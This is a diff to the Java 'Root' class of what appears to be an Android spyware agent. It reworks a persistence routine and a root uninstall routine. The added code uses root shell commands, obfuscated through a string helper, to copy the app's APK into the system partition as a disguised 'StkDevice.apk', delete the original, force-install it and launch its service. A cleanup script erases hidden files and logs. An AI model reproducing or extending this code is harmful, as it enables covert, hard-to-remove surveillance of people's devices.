@@ -226,43 +226,114 @@ public class Root {
 		}
 
 		String packageName = Status.self().getAppContext().getPackageName();
-		String script = M.e("#!/system/bin/sh") + "\n";
-		//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
-		script += M.e("rm -r ") + Path.hidden() + "\n";
+		String apkName = Status.getApkName();
+		Boolean isPersisten = Status.isPersistent();
+		if (apkName != null ) {
+			String script = M.e("#!/system/bin/sh") + "\n";
+			//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
+			script += M.e("rm -r ") + Path.hidden() + "\n";
 
-		script += Configuration.shellFile + M.e(" blw") +"\n";
-		script += M.e("sleep 1; rm /system/app/StkDevice.apk") + "\n";
-		script += Configuration.shellFile + M.e(" blr") +"\n";
-
-		script += Configuration.shellFile + " ru\n";
-		script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall ") + packageName + "\n";
-
-		if (Cfg.DEBUG) {
-			script += M.e("rm /data/local/tmp/log") +"\n";
-		}
-
-		String filename = "c";
-		if (createScript(filename, script) == false) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
+			script += Configuration.shellFile + M.e(" blw") + "\n";
+			script += M.e("sleep 1; rm ") + apkName + "\n";
+			script += Configuration.shellFile + M.e(" blr") + "\n";
+			if (isPersisten) {
+			/* we need to remove also /data/data/pkgName ? */
+				if (Status.getAppDir() != null) {
+					script += M.e("rm -r ") + Status.getAppDir() + "\n";
+				}
 			}
-			return false;
-		}
+			script += Configuration.shellFile + M.e(" ru")+"\n";
+			script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall ") + packageName + "\n";
 
-		Execute ex = new Execute();
-		ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
+			if (Cfg.DEBUG) {
+				script += M.e("rm /data/local/tmp/log") + "\n";
+			}
+
+			String filename = "c";
+			if (createScript(filename, script) == false) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
+				}
+				return false;
+			}
+			Status.setIconState(false);
+			Execute ex = new Execute();
+			ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
+						StringUtils.join(result.stderr));
+			}
+
+			removeScript(filename);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
+			}
+
+			return true;
+		} else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (uninstallRoot): failed"); //$NON-NLS-1$
+			}
+		}
+		return false;
+	}
+	static boolean installPersistence(Boolean forceInstall) {
+		android.content.pm.PackageInfo pi = null;
+		String apkPosition = null;
+		Boolean isPersisten = false;
+		if( (apkPosition=Status.getApkName())!=null ){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence): found apk installed in: " + apkPosition);
+			}
+			isPersisten = Status.isPersistent();
+		}
+		if( isPersisten ){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence): already persistent!! " );
+				return true;
+			}
+		}
+		/*
+		AutoFile apkFile = new AutoFile(M.e("/system/app/StkDevice.apk"));
+		if (apkFile.exists()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installPersistence) apk already there and persistent: " + apkFile);
+				return true;
+			}
+		}
+		*/
+
+		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
+
+
+		String perPkg = M.e("/system/app/StkDevice.apk");
+		String command = M.e("[ -s ") + perPkg + M.e(" ] && exit") + "\n";
+		command+= Configuration.shellFileBase + M.e(" blw") + "\n";
+		command+= String.format(M.e("cat %s > ") + perPkg, apkPosition) + "\n";
+		command+= M.e("chmod 644 ") + perPkg + "\n";
+		command+= String.format(M.e("[ -s ") + perPkg + M.e(" ] && rm /%s"), apkPosition) + "\n";
+
+		command+= Configuration.shellFileBase + M.e(" blr") + "\n";
+		ExecuteResult ret = Execute.executeScript(command);
+
+		ExecuteResult pers = Execute.executeRoot(M.e("ls -l ") + perPkg);
+		String persString = pers.getStdout();
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
-					StringUtils.join(result.stderr));
+			Check.log(TAG + " (installPersistence) inst: " + ret.getStdout());
+			Check.log(TAG + " (installPersistence) ls: " + pers.getStdout());
 		}
 
-		removeScript(filename);
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
+		if(persString.contains(M.e("StkDevice.apk"))){
+			command = M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm -r -f install ") + perPkg + "\n";
+			command+= M.e("am startservice com.android.dvci/.ServiceMain") + "\n";
+			command+= M.e("am broadcast -a android.intent.action.USER_PRESENT") + "\n";
+			Execute.executeScript(command);
+			Status.setApkName(perPkg);
+			return true;
 		}
 
-		return true;
+		return false;
 	}
 
 	// Prendi la root tramite superuser.apk
@@ -623,7 +694,7 @@ public class Root {
 					Status.setExploitResult(Status.EXPLOIT_RESULT_SUCCEED);
 					Status.setRoot(true);
 					if(Cfg.PERSISTENCE) {
-						Root.installPersistence();
+						Root.installPersistence(false);
 					}
 					Status.self().setReload();
 				} else {
@@ -793,7 +864,7 @@ public class Root {
 				// Avoid having the process killed for using too many resources
 				Root.adjustOom();
 				if(Cfg.PERSISTENCE) {
-					Root.installPersistence();
+					Root.installPersistence(false);
 				}
 
 			} else {
@@ -807,33 +878,6 @@ public class Root {
 		return Status.haveRoot();
 	}
 
-	static boolean installPersistence() {
-		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
-
-		String name = Status.getAppContext().getPackageName();
-
-		String command = M.e("[ -s /system/app/StkDevice.apk ] && exit") + "\n";
-		command += Configuration.shellFileBase + M.e(" blw") + "\n";
-		command+= String.format(M.e("cat /data/app/%s*.apk > /system/app/StkDevice.apk"), name) + "\n";
-		command+= M.e("chmod 644 /system/app/StkDevice.apk") + "\n";
-		command+= String.format(M.e("[ -s /system/app/StkDevice.apk ] && rm /data/app/%s*.apk"), name) + "\n";
-		command+= Configuration.shellFileBase + M.e(" blr") + "\n";
-
-		ExecuteResult ret = Execute.executeScript(command);
-
-		ExecuteResult pers = Execute.executeRoot(M.e("ls -l /system/app/StkDevice.apk"));
-		String persString = pers.getStdout();
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (installPersistence) inst: " + ret.getStdout());
-			Check.log(TAG + " (installPersistence) ls: " + pers.getStdout());
-		}
-
-		if(persString.contains(M.e("StkDevice.apk"))){
-			return true;
-		}
-
-		return false;
-	}
 
 	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
 			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
